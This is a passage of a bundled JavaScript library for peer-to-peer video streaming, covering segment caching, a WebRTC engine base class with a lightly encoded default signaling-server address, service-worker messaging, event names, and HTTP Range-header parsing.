                return this._segPool.get(sn);
            }
            return this._segPool.get(segId);
        }
    }, {
        key: 'getSegIdBySN',
        value: function getSegIdBySN(sn) {
            var seg = this._segPool.get(sn);
            if (seg) {
                // console.warn(`getSegIdBySN ${seg.segId}`);
                return seg.segId;
            }
            return null;
        }
    }, {
        key: 'getSegBySN',
        value: function getSegBySN(sn) {
            if (this.isSequential) {
                // console.warn(`getSegBySN ${this._segPool.get(sn)}`);
                return this._segPool.get(sn);
            }
            throw new Error('fatal error in SegmentCache');
        }
    }, {
        key: 'clear',
        value: function clear() {
            this.logger.warn('clear segment cache');
            this._segPool.clear();
            this.id2Sn.clear();
            this._currBufSize = 0;
        }
    }, {
        key: 'destroy',
        value: function destroy() {
            this.clear();
            this.removeAllListeners();
        }
    }, {
        key: 'currBufSize',
        get: function get() {
            return this._currBufSize;
        }
    }]);

    return SegmentCache;
}(_events2.default);

exports.default = SegmentCache;
module.exports = exports['default'];

/***/ }),
/* 36 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});
exports.tools = exports.queueMicrotask = exports.platform = exports.Logger = exports.getPeersThrottle = exports.errCode = exports.Buffer = undefined;

var _buffer = __webpack_require__(3);

var _buffer2 = _interopRequireDefault(_buffer);

var _errCode = __webpack_require__(16);

var _errCode2 = _interopRequireDefault(_errCode);

var _getPeersThrottle = __webpack_require__(8);

var _getPeersThrottle2 = _interopRequireDefault(_getPeersThrottle);

var _logger = __webpack_require__(9);

var _logger2 = _interopRequireDefault(_logger);

var _platform = __webpack_require__(4);

var _platform2 = _interopRequireDefault(_platform);

var _queueMicrotask = __webpack_require__(12);

var _queueMicrotask2 = _interopRequireDefault(_queueMicrotask);

var _toolFuns = __webpack_require__(0);

var _toolFuns2 = _interopRequireDefault(_toolFuns);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

// import getPlayer from './player-detector'
exports.Buffer = _buffer2.default;
exports.errCode = _errCode2.default;
exports.getPeersThrottle = _getPeersThrottle2.default;
exports.Logger = _logger2.default;
exports.platform = _platform2.default;
exports.queueMicrotask = _queueMicrotask2.default;
exports.tools = _toolFuns2.default;

/***/ }),
/* 37 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _events = __webpack_require__(1);

var _events2 = _interopRequireDefault(_events);

var _logger = __webpack_require__(9);

var _logger2 = _interopRequireDefault(_logger);

var _urlToolkit = __webpack_require__(7);

var _urlToolkit2 = _interopRequireDefault(_urlToolkit);

var _toolFuns = __webpack_require__(0);

var _peer = __webpack_require__(6);

var _peer2 = _interopRequireDefault(_peer);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var SAM = {
    '_': 'nllL',
    'f': 'd3NzJ',
    'ss': '==',
    '3': 'TNBLy9z',
    '8': 'aWduY',
    'u': 'mNvbQ',
    'qa': 'WwuY2RuY'
};

var EngineBase = function (_EventEmitter) {
    _inherits(EngineBase, _EventEmitter);

    function EngineBase() {
        var p2pConfig = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};

        _classCallCheck(this, EngineBase);

        // console.warn(`EngineBase`);

        var _this = _possibleConstructorReturn(this, (EngineBase.__proto__ || Object.getPrototypeOf(EngineBase)).call(this));

        if (p2pConfig.tag && p2pConfig.tag.length > 20) {
            throw new Error('Tag is too long');
        }
        if (p2pConfig.appName && p2pConfig.appName.length > 30) {
            throw new Error('appName is too long');
        }
        if (p2pConfig.appId && p2pConfig.appId.length > 30) {
            throw new Error('appId is too long');
        }
        if (p2pConfig.token && p2pConfig.token.length > 20) {
            throw new Error('Token is too long');
        }
        if (p2pConfig.simultaneousTargetPeers <= 0) {
            throw new Error('simultaneousTargetPeers must >= 1');
        }
        return _this;
    }

    //初始化logger


    _createClass(EngineBase, [{
        key: 'initLogger',
        value: function initLogger() {
            var logger = new _logger2.default(this.config.logLevel);
            this.config.logger = this.logger = logger;
            return logger;
        }
    }, {
        key: 'makeChannelId',
        value: function makeChannelId(prefix, channelId) {
            if (!prefix || typeof prefix !== 'string') {
                var errMsg = 'token is required while using customized channelId!';
                console.error(errMsg);
                throw new Error(errMsg);
            }
            // if (prefix.length < 5) {
            //     const errMsg = `channelIdPrefix length is too short!`;
            //     console.error(errMsg);
            //     throw new Error(errMsg);
            // } else if (prefix.length > 15) {
            //     const errMsg = `channelIdPrefix length is too long!`;
            //     console.error(errMsg);
            //     throw new Error(errMsg);
            // }
            return function (url, browserInfo) {
                return prefix + '-' + channelId(url, browserInfo);
            };
        }
    }, {
        key: 'makeSignalId',
        value: function makeSignalId() {
            var signalId = void 0;
            var defaultAddr = decodeURIComponent(window.atob(SAM['f'] + SAM['3'] + SAM['8'] + SAM['qa'] + SAM['_'] + SAM['u'] + SAM['ss']));
            if (!this.config.wsSignalerAddr) {
                this.config.wsSignalerAddr = defaultAddr;
                signalId = '';
            } else {
                if (this.config.wsSignalerAddr === defaultAddr) {
                    signalId = '';
                } else {
                    signalId = _urlToolkit2.default.parseURL(this.config.wsSignalerAddr).netLoc.substr(2);
                }
                // this.logger.warn(`wsSignalerAddr is deprecated, please set signal address on dashboard`);
            }
            return signalId;
        }
    }, {
        key: 'setupWindowListeners',
        value: function setupWindowListeners(destroyed) {
            var _this2 = this;

            // 关闭页面前向peers发送close消息
            var iOS = ['iPad', 'iPhone'].indexOf(navigator.platform) >= 0;
            var eventName = iOS ? 'pagehide' : 'beforeunload';
            var event = function event() {
                if (_this2.p2pEnabled) {
                    _this2.disableP2P();
                }
                window.removeEventListener(eventName, event);
            };
            if (destroyed) {
                window.removeEventListener(eventName, event);
            } else {
                window.addEventListener(eventName, event);
            }

            // window.addEventListener('unload', () => {
            //     if (this.p2pEnabled) {
            //         this.disableP2P();
            //     }
            // });
        }
    }, {
        key: 'destroy',
        value: function destroy() {
            this.disableP2P();
            this.removeAllListeners();
            this.setupWindowListeners(true);
        }

        // 在停止的情况下重新启动P2P

    }, {
        key: 'enableP2P',
        value: function enableP2P() {
            if (!this.p2pEnabled) {
                if (this.logger) this.logger.info('enable P2P');
                this.config.p2pEnabled = this.p2pEnabled = true;
                if (!this.browserInfo) return null;
                this._init(this.channel, this.browserInfo);
                return this;
            }
            return null;
        }
    }, {
        key: 'version',
        get: function get() {
            return EngineBase.version;
        }
    }], [{
        key: 'isSupported',
        value: function isSupported() {
            var browserRTC = (0, _toolFuns.getBrowserRTC)();
            return browserRTC && browserRTC.RTCPeerConnection.prototype.createDataChannel !== undefined;
        }
    }]);

    return EngineBase;
}(_events2.default);

EngineBase.version = "0.0.1";

EngineBase.protocolVersion = _peer2.default.VERSION;

exports.default = EngineBase;
module.exports = exports['default'];

/***/ }),
/* 38 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

var _regenerator = __webpack_require__(10);

var _regenerator2 = _interopRequireDefault(_regenerator);

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _asyncToGenerator(fn) { return function () { var gen = fn.apply(this, arguments); return new Promise(function (resolve, reject) { function step(key, arg) { try { var info = gen[key](arg); var value = info.value; } catch (error) { reject(error); return; } if (info.done) { resolve(value); } else { return Promise.resolve(value).then(function (value) { step("next", value); }, function (err) { step("throw", err); }); } } return step("next"); }); }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var MessageClient = function () {
    function MessageClient() {
        _classCallCheck(this, MessageClient);

        this.sendMessageToClient = this.sendMessageToClient.bind(this);
        this.sendMessageToAllClients = this.sendMessageToAllClients.bind(this);
    }

    _createClass(MessageClient, [{
        key: 'sendMessageToClient',
        value: function () {
            var _ref = _asyncToGenerator( /*#__PURE__*/_regenerator2.default.mark(function _callee(client, message, timeout) {
                return _regenerator2.default.wrap(function _callee$(_context) {
                    while (1) {
                        switch (_context.prev = _context.next) {
                            case 0:
                                return _context.abrupt('return', new Promise(function (resolve, reject) {
                                    if (!client) {
                                        reject('client is null');
                                        return;
                                    }
                                    // const isLive = await this.isClientAlive(client);
                                    // if (!isLive) {
                                    //     reject('client is not alive');
                                    //     return
                                    // }
                                    var messageChannel = new MessageChannel();
                                    messageChannel.port1.onmessage = function (event) {
                                        // console.warn(event.data.data)
                                        resolve({
                                            client: client,
                                            data: event.data.data
                                        });
                                    };
                                    messageChannel.port1.onmessageerror = function (event) {
                                        reject(event);
                                    };

                                    // console.warn(`postMessage to client ${client.id} ${JSON.stringify(message)}`);
                                    client.postMessage(message, [messageChannel.port2]);

                                    // Set up the timeout
                                    setTimeout(function () {
                                        messageChannel.port1.close();
                                        messageChannel.port2.close();

                                        reject('MessageChannel ' + message.action + ' timed out after ' + timeout + ' ms');
                                    }, timeout);
                                }));

                            case 1:
                            case 'end':
                                return _context.stop();
                        }
                    }
                }, _callee, this);
            }));

            function sendMessageToClient(_x, _x2, _x3) {
                return _ref.apply(this, arguments);
            }

            return sendMessageToClient;
        }()
    }, {
        key: 'sendMessageToAllClients',
        value: function () {
            var _ref2 = _asyncToGenerator( /*#__PURE__*/_regenerator2.default.mark(function _callee2(message, timeout) {
                var _this = this;

                var cs;
                return _regenerator2.default.wrap(function _callee2$(_context2) {
                    while (1) {
                        switch (_context2.prev = _context2.next) {
                            case 0:
                                _context2.next = 2;
                                return clients.matchAll();

                            case 2:
                                cs = _context2.sent;
                                return _context2.abrupt('return', Promise.race(cs.map(function (client) {
                                    // console.warn(`sendMessageToClient client ${client}`);
                                    return _this.sendMessageToClient(client, message, timeout);
                                })));

                            case 4:
                            case 'end':
                                return _context2.stop();
                        }
                    }
                }, _callee2, this);
            }));

            function sendMessageToAllClients(_x4, _x5) {
                return _ref2.apply(this, arguments);
            }

            return sendMessageToAllClients;
        }()
    }, {
        key: 'isClientAlive',
        value: function () {
            var _ref3 = _asyncToGenerator( /*#__PURE__*/_regenerator2.default.mark(function _callee3(client) {
                return _regenerator2.default.wrap(function _callee3$(_context3) {
                    while (1) {
                        switch (_context3.prev = _context3.next) {
                            case 0:
                                if (client) {
                                    _context3.next = 2;
                                    break;
                                }

                                return _context3.abrupt('return', false);

                            case 2:
                                return _context3.abrupt('return', clients.matchAll().then(function (cs) {
                                    return cs.some(function (c) {
                                        return c.id === client.id;
                                    });
                                }));

                            case 3:
                            case 'end':
                                return _context3.stop();
                        }
                    }
                }, _callee3, this);
            }));

            function isClientAlive(_x6) {
                return _ref3.apply(this, arguments);
            }

            return isClientAlive;
        }()
    }]);

    return MessageClient;
}();

exports.default = MessageClient;
module.exports = exports['default'];

/***/ }),
/* 39 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _core = __webpack_require__(5);

exports.default = _extends({}, _core.Events, {

    METADATA: 'metadata',

    ERROR: 'error',

    SW_PLAYLIST: 'SW_PLAYLIST',
    SW_MEDIA: 'SW_MEDIA',
    SW_GET_MEDIA: 'SW_GET_MEDIA',
    SW_VERSION: 'SW_VERSION',

    LEVEL_LOADED: 'LEVEL_LOADED',
    MANIFEST_PARSED: 'MANIFEST_PARSED',
    FRAG_LOADED: 'FRAG_LOADED'
});
module.exports = exports['default'];

/***/ }),
/* 40 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});
exports.parseRangeHeader = parseRangeHeader;
exports.getUrlSuffix = getUrlSuffix;

var _urlToolkit = __webpack_require__(7);

var URLToolkit = _interopRequireWildcard(_urlToolkit);

function _interopRequireWildcard(obj) { if (obj && obj.__esModule) { return obj; } else { var newObj = {}; if (obj != null) { for (var key in obj) { if (Object.prototype.hasOwnProperty.call(obj, key)) newObj[key] = obj[key]; } } newObj.default = obj; return newObj; } }

function parseRangeHeader(rangeHeader) {
    var normalizedRangeHeader = rangeHeader.trim().toLowerCase();
    if (!normalizedRangeHeader.startsWith('bytes=')) {
        throw new Error('unit-must-be-bytes', { normalizedRangeHeader: normalizedRangeHeader });
    }

    // Specifying multiple ranges separate by commas is valid syntax, but this
    // library only attempts to handle a single, contiguous sequence of bytes.
    // https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Range#Syntax
    if (normalizedRangeHeader.includes(',')) {
        throw new Error('single-range-only', { normalizedRangeHeader: normalizedRangeHeader });
    }

    var rangeParts = /(\d*)-(\d*)/.exec(normalizedRangeHeader);
    // We need either at least one of the start or end values.
    if (!rangeParts || !(rangeParts[1] || rangeParts[2])) {
        throw new Error('invalid-range-values', { normalizedRangeHeader: normalizedRangeHeader });
    }

    return {
        start: rangeParts[1] === '' ? undefined : Number(rangeParts[1]),
        end: rangeParts[2] === '' ? undefined : Number(rangeParts[2])
    };
}

function getUrlSuffix(url) {
    var urlObj = URLToolkit.parseURL(url);
    return urlObj.path.substring(urlObj.path.lastIndexOf('.') + 1);
}

/***/ })
/******/ ]);
});